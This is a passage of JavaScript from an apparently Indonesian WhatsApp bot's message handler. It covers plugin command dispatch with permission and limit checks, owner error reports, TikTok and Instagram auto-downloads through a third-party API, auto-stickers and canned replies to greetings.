let fail = plugin.fail || global.dfail 
usedPrefix = (match[0] || '')[0]||prefix



if (command || usedPrefix ) {

let noPrefix = m.body.replace(usedPrefix, '')
let _args = noPrefix.trim().split` `.slice(1)
let text = q 
var isAccept = plugin.command instanceof RegExp ? // RegExp Mode?
plugin.command.test(command):
Array.isArray(plugin.command) ? // Array?
plugin.command.some(cmd => cmd instanceof RegExp ? // RegExp in Array?
cmd.test(command) : cmd === command) : typeof plugin.command === 'string' ? // String?
plugin.command === command : false

if (!isAccept) continue


m.plugin = name
if (plugin.rowner && plugin.owner && !(isOwner)) {
return onlyOwner()
break
}
if (plugin.owner && !isOwner) {
return onlyOwner()
break
}  
if (plugin.premium && !isPremium) {
return onlyPrem()
break
}

if (plugin.group && !m.isGroup) {
return onlyToko()
break
}

if (plugin.selerpanel && !isResPanel) {
fail('selerpanel')
break
}
if (plugin.nsfw && !isAntiNsfw) {
setReply(mess.nsfw)
break
} else if (plugin.botAdmin && !m.isBotAdmin) {
return onlyBadmin()
break
} else if (plugin.admin && !m.isAdmin) {
return onlyAdmin()
break
}

if (plugin.private && m.isGroup) {
return onlyPrivate()
break
}
if (plugin.register && !_user.registered) {
return sendButDaftar()
break
}
if (plugin.onlyprem && !m.isGroup && !isPremium) {
return onlyPrem()
break
}
if (plugin.rpg && m.isGroup && !global.db.data.chats[m.chat].rpg) {
fail('rpg')
break
}
if (plugin.game && m.isGroup && !global.db.data.chats[m.chat].game) {
 setReply(mess.game)
    break;
}

if (plugin.limit && !isPremium && _user.limit < plugin.limit * 1) {
    return onlyLimit()
}

if (plugin.limit && !isPremium) {
    _user.limit -= 1; 
   // reply('✅ 1 limit terpakai'); // Memberi tahu pengguna bahwa 1 limit telah terpakai
}


if (user && plugin.level > _user.level) {
hanz.reply(m.chat, `[💬] Mohon maaf level yang di perlukan untuk menggunakan fitur ini ${plugin.level}\n*Level mu:* ${_user.level} 📊`, m, {
contextInfo: {
externalAdReply: {
title: pushname, body: 'Akses Di Tolak', sourceUrl: syt, thumbnail:fs.readFileSync('./stik/danied.jpeg')
}
}
})
break
}
if (user && plugin.age > _user.age) {
hanz.reply(m.chat, `[💬] Umurmu harus diatas ${plugin.age} Tahun untuk menggunakan fitur ini...`, m, {
contextInfo: {
externalAdReply: {
title: pushname
, body: 'Akses Di Tolak', sourceUrl: web, thumbnail: fs.readFileSync('./stik/danied.jpeg')
}
}
})
break
}



let extra = {
setReply,
reply,
replyDoc,
sendSticker,
sendvn,
dmusic,
sendReact,
sendMusic,
sendThumb,
onlyOwner,
onlyAdmin,
onlyBadmin,
onlyPrem,
onlyLimit,
onlyGlimit,
onlyPrivate,
onlyToko,
otw,
store,
isAccept,
q,
prefix,
usedPrefix,
noPrefix,
args,
command,
text,
from,
budy,
hanz,
participants: m.groupMembers,
groupMetadata: m.groupMetadata,
user: m.user,
bot: m.bot,
isROwner: isOwner,
isOwner,
isRAdmin: m.isRAdmin,
isAdmin: m.isAdmin,
isBotAdmin: m.isBotAdmin,
isPremium,
isResPanel,
isprems: isPremium,
chatUpdate,
__dirname: ___dirname,
__filename
}

try {
await plugin.call(hanz, m, extra)
} catch (err) {

if(err.message !== undefined){
  let e = util.format(err);
  await hanz.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${botName}`, m) 
  if (isCmd) Failed(toFirstCase(command), dash)
  if(checkError(err.message, db.data.listerror)) return
addError(err.message, command, db.data.listerror)
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
  }

  

await sleep(2000)
m.reply(`*🗂️ Plugin:* ${m.plugin}\n*👤 Sender:* ${m.sender}\n*💬 Chat:* ${m.chat}\n*💻 Command:* ${usedPrefix}${command} ${args.join(' ')}\n📄 *Error Logs:*\n\n\ ${e}`.trim(), nomerOwner+"@s.whatsapp.net")
} else {
  //log(err)
  let e = util.format(err)
  m.reply(`${e}`)

}




} finally {

if (typeof plugin.after === 'function') {
try {
await plugin.after.call(hanz, m, extra)
} catch (e) {
console.error(e)
}
}

}
break
}


}//akhir dari name in global plugins      
 

if ( autoDetectCmd ) {
  if (isCmd && !isAccept) {
    await Nothing(toFirstCase(command), dash, allcommand);

    const stringSimilarity = require("string-similarity");
    let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand);

    setReply(`ᴄᴏᴍᴍᴀɴᴅ *${prefix + command}* ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ\nᴍᴜɴɢᴋɪɴ ʏᴀɴɢ ᴋᴀᴍᴜ ᴍᴀᴋꜱᴜᴅ ᴀᴅᴀʟᴀʜ *${prefix + matches.bestMatch.target.toLowerCase()}*`);
  }
}} // Akhir switch command


// Auto Download Video TikTok
if (budy.startsWith('https://vt.tiktok.com/') || 
    budy.startsWith('https://www.tiktok.com/') || 
    budy.startsWith('https://vm.tiktok.com/')) {
    try {
        // Mengambil data dari API TikTok
        let res = await fetch(`https://skizoasia.xyz/api/tiktok?url=${budy}&apikey=Rangelofficial`);
        let json = await res.json();

        // Format pesan informasi
        let fbk = `*🎵 乂 Tiktok Downloader 🎵*\n\n` +
                  `👤 *Nama:* ${json.data.author.nickname}\n` +
                  `🆔 *Nickname:* @${json.data.author.unique_id}\n` +
                  `📅 *ID:* ${json.data.id}\n` +
                  `📝 *Deskripsi:* ${json.data.title}`;

        // Kirim reaksi loading
        await hanz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        // Kirim video dengan caption
        await hanz.sendMessage(m.chat, { video: { url: json.data.play }, caption: fbk }, { quoted: m });
    } catch (err) {
        console.log(err); // Menangani error dengan benar
    }
}
// Auto Download Video IG
if (budy.startsWith("https://www.instagram.com/reel/") || budy.startsWith("https://www.instagram.com/p/")) {
    try {
        // Mengambil data dari API Instagram
        let res = await fetchJson(`https://skizoasia.xyz/api/instagram?apikey=Rangelofficial&url=${budy}}`);

        // Mengirim reaksi loading
        await hanz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        // Mengirim setiap media
        for (let i of res.media) {
            await sleep(100); // Delay sebelum mengirim
            await hanz.sendMessage(m.chat, { video: { url: i }, caption: `*乂 Instagram Downloader*\n\n${res.caption}` }, { quoted: m });
        }
    } catch (err) { 
        // Menangani error dengan cara yang elegan
        m.reply(err); 
    }
}

if (autoSticker) {
    try {
        let WSF = require('wa-sticker-formatter');
        let wsf = false;
        let mime = (m.msg || m).mimetype || '';
        
        // Jika MIME adalah image
        if (/image/.test(mime)) {
            let img = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5));
            wsf = new WSF.Sticker(img, {
                pack: botName,
                type: WSF.StickerTypes.FULL,
                author: pushname,
                crop: true,
            });
        }
        // Jika MIME adalah video
        else if (/video/.test(mime)) {
            let vid = await hanz.downloadAndSaveMediaMessage(quoted, makeid(5));
            wsf = new WSF.Sticker(vid, {
                pack: botName,
                type: WSF.StickerTypes.FULL,
                author: pushname,
                crop: true,
                quality: 60, // Set kualitas stiker dari video
                fps: 10, // Set frame rate jika diperlukan
            });
        }

        // Jika wsf (stiker) sudah dibuat, kirimkan
        if (wsf) {
            await wsf.build();
            const sticBuffer = await wsf.get();
            if (sticBuffer) {
                await hanz.sendMessage(from, { sticker: sticBuffer }, { quoted: m, mimetype: 'image/webp' });
            }
        }
    } catch (err) {
        console.error(err);
    }
}


//User Private Chat
if (!isGroup && user && isPremium && new Date - user.pc < 86400000) {
} else if(!isGroup && user && isPremium && !itsMe) {
setReply( `Hai ${ucapanWaktu} kak *${pushname}*  ada yang bisa aku bantu ? silakan ketik ${prefix}menu`)
user.pc = new Date * 1
}
//Jika ada yg panggil bot
if (katabot.includes(budy)) {	
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(halo)
}
//Jika ada yg lopyu
if (katalopyu.includes(budy)) {	
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(lopyoutoo)
}
//Jika ada yang bilang ohayo pagi bot akan merespon✓
if(ohayo.includes(budy)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Hadeuh sekarang udah ga pagi kak") 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(pagi)
//setReply(`${ucapanWaktu} kak`)
}
//Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(budy)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Hadeuh sekarang udah ga malem kak")
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(malam)
//setReply(`${ucapanWaktu} kak`)
}
//Jika ada yang bilang koniciwa siang bot akan merespon✓
if(katasiang.includes(budy)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
if (timeWib >= '06:00' && timeWib <= '00:00')  return setReply("Hadeuh sekarang udah ga siang kak")
addSpam("NotCase",senderNumber, "10s", AntiSpam)
 sendvn(siang)
//setReply(`${ucapanWaktu} kak`)
}
//Jika ada yg ucap salam bot akan merespon   
if (budy.startsWith('Assalamualaikum') || budy.startsWith('assalamualaikum')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(walaikumsalam)
}
//Jika ada yg ucap salam bot akan merespon   
if (budy.startsWith('SALKEN') || budy.startsWith('salken')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
m.reply(`salam kenal juga ${pushname}`)
}
//Jika ada yg ara bot✓
if (katara.includes(budy)) {		
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(wibu)
}
//JIKA ADA YANG TAG NOMOR OWNER 
if (isGroup && budy.includes(`${devoloper1}`)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
//sendSticker(TagOwner)
const kta = ['*Iya kak itu nomer ayang aku ada apa ya ??*\n','*Jangan di tag dia sedang sibuk.*\n','*Kenapa kak tag ayang aku??*\n']
const su = kta[Math.floor(Math.random() * kta.length)]
hanz.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: false,
groupMentions: [
{
groupJid: m.chat,
groupSubject: su,
}
]
}
},{quoted:m}
)
 
}   
//ketika ada yang invite/kirim link grup di chat pribadi
//Di kasih ama Alyul
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let teks = dada(prefix, pushname, ucapanWaktu)      
reply (teks)
}


//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
conn.sendMessage(from,{text:  `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`}, { quoted: m })
 }
//Jika ada yg toxic botz akan merespon✓
if (bad.includes(budy)) {	
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
sendvn(astaga)

}   


} catch (err){
  Log(err)
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
if(err.message.includes("Cannot find module")){
let module = err.message.split("Cannot find module '")[1].split("'")[0]
let teks = `Module ${module} belom di install
silakan install terlebih dahulu`
return await hanz.sendText(m.key.remoteJid, teks, m)
}
await hanz.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake}`, m) 
if(checkError(err.message, db.data.listerror)) return
addError(err.message, command, db.data.listerror)
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 

  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){ 
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await hanz.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]─── 「 Laporan Bug ⚠️」 ───[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`

hanz.sendText(Ownerin, teks, m)

/*if(!autoblockcmd){
await hanz.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}*/

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
await hanz.sendMedia (Ownerin, media, m, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



  
} catch (err){
console.log(chalk.bgRed(color("[  ERROR  ]", "black")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await hanz.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true
 hanz.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if(Console){
hanz.sendMessage(Ownerin, {text : util.format(e)})
}
//console.log(e)
}
}

       
    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.bgGreen(color("[  UPDATE ]", "black")),chalk.white(`${__filename}`) )
delete require.cache[file]
require(file)
  })